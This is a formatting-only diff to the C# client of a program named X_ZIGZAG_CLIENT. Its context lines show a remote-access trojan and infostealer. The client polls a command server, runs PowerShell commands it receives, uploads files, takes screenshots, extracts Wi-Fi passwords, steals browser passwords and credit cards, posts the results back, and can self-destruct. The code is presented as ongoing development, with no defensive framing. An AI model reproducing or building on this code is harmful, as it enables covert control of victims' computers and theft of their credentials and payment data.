@@ -26,7 +26,7 @@ namespace X_ZIGZAG_CLIENT
     public class Response
     {
         [DataMember]
-        public string output{ get; set; }
+        public string output { get; set; }
     }
     [DataContract]
     public class ClientPingResponse
@@ -75,9 +75,10 @@ namespace X_ZIGZAG_CLIENT
             Task.Run(() => InstructionHandler());
             // Start Server Ping Handler
             Task.Run(() => Check()).Wait();
-            
+
         }
-        static string GenerateUUID() {
+        static string GenerateUUID()
+        {
             FileInfo fileInfo = new FileInfo(Process.GetCurrentProcess().MainModule.FileName);
             byte[] timestampBytes = BitConverter.GetBytes(fileInfo.LastWriteTime.Ticks);
 
@@ -100,10 +101,10 @@ namespace X_ZIGZAG_CLIENT
                         Actions.CaptureScreens(uuid, EndPoint);
                         Screenshots = 0;
                     }
-                    else if(Screenshots > 0)
+                    else if (Screenshots > 0)
                     {
                         Actions.CaptureScreens(uuid, EndPoint);
-                        Thread.Sleep(Screenshots*1000);
+                        Thread.Sleep(Screenshots * 1000);
                     }
                     else
                     {
@@ -120,10 +121,10 @@ namespace X_ZIGZAG_CLIENT
         {
             while (true)
             {
-                if (instructionsQueue.Count==0)
+                if (instructionsQueue.Count == 0)
                 {
-                   Thread.Sleep(1000);
-                    
+                    Thread.Sleep(1000);
+
                 }
                 else
                 {
@@ -131,13 +132,13 @@ namespace X_ZIGZAG_CLIENT
                     switch (oldestInstruction.code)
                     {
                         case -2:
-                            Actions.UpdateDataWithRetry(10,uuid, oldestInstruction.instructionId, EndPoint);
+                            Actions.UpdateDataWithRetry(10, uuid, oldestInstruction.instructionId, EndPoint);
                             break;
                         case -1:
                             Actions.SelfDestruct();
                             break;
                         case 0:
-                            await FilesHandler.UploadFileAsync(EndPoint+"Response/File/"+uuid+"/"+oldestInstruction.instructionId, oldestInstruction.functionArgs);
+                            await FilesHandler.UploadFileAsync(EndPoint + "Response/File/" + uuid + "/" + oldestInstruction.instructionId, oldestInstruction.functionArgs);
 
                             break;
                         case 1:
@@ -152,7 +153,8 @@ namespace X_ZIGZAG_CLIENT
 
                             break;
                         case 2:
-                            if (oldestInstruction.functionArgs == null || oldestInstruction.functionArgs.Equals("")) {
+                            if (oldestInstruction.functionArgs == null || oldestInstruction.functionArgs.Equals(""))
+                            {
                                 NotifyWithRetry(oldestInstruction.instructionId, "No Args?");
                                 break;
                             }
@@ -165,7 +167,7 @@ namespace X_ZIGZAG_CLIENT
                                 NotifyWithRetry(oldestInstruction.instructionId, "No Args?");
                                 break;
                             }
-                            string PwsOutput = Actions.ExecuteCommand(oldestInstruction.functionArgs,true);
+                            string PwsOutput = Actions.ExecuteCommand(oldestInstruction.functionArgs, true);
                             NotifyWithRetry(oldestInstruction.instructionId, PwsOutput);
                             break;
                         case 4:
@@ -175,7 +177,7 @@ namespace X_ZIGZAG_CLIENT
                             NotifyWithRetry(oldestInstruction.instructionId, Actions.ExtractWiFiPasswords());
                             break;
                         case 6: // Browsers Password
-                            Actions.GetBrowsersPasswords(EndPoint, oldestInstruction.instructionId,uuid);
+                            Actions.GetBrowsersPasswords(EndPoint, oldestInstruction.instructionId, uuid);
                             break;
                         case 7: // Browsers Credit Cards
                             Actions.GetBrowsersCreditCards(EndPoint, oldestInstruction.instructionId, uuid);
@@ -219,7 +221,7 @@ namespace X_ZIGZAG_CLIENT
 
                         using (MemoryStream ms = new MemoryStream())
                         {
-                            serializer.WriteObject(ms, new Response { output=output});
+                            serializer.WriteObject(ms, new Response { output = output });
                             var content = new StringContent(System.Text.Encoding.UTF8.GetString(ms.ToArray()), Encoding.UTF8, "application/json");
                             var response = await httpClient.PostAsync(EndPoint + "Response/" + uuid + "/" + instructionId, content);
                             response.EnsureSuccessStatusCode();
@@ -244,7 +246,7 @@ namespace X_ZIGZAG_CLIENT
                     using (HttpClient client = new HttpClient())
                     {
                         // Make the POST request
-                        HttpResponseMessage s = await client.GetAsync(EndPoint + "Client/Check/"+ uuid);
+                        HttpResponseMessage s = await client.GetAsync(EndPoint + "Client/Check/" + uuid);
                         if (s.IsSuccessStatusCode)
                         {
                             string responseContent = await s.Content.ReadAsStringAsync();
@@ -256,20 +258,20 @@ namespace X_ZIGZAG_CLIENT
 
                                 // Deserialize the MemoryStream to an object
                                 var clientPingResponse = (ClientPingResponse)serializer.ReadObject(memoryStream);
-                                DelayDuration = clientPingResponse.nextPing*1000;
+                                DelayDuration = clientPingResponse.nextPing * 1000;
                                 if (clientPingResponse.screenshot != null)
                                 {
                                     Screenshots = (int)clientPingResponse.screenshot;
                                 }
                                 ;
-                                if (clientPingResponse.instructions!= null && clientPingResponse.instructions.Count > 0)
+                                if (clientPingResponse.instructions != null && clientPingResponse.instructions.Count > 0)
                                 {
-                                    foreach(var inst in clientPingResponse.instructions)
+                                    foreach (var inst in clientPingResponse.instructions)
                                     {
                                         lock (instructionsQueueLock)
                                         {
                                             instructionsQueue.Enqueue(inst);
-                                            
+
                                         }
                                     }
 
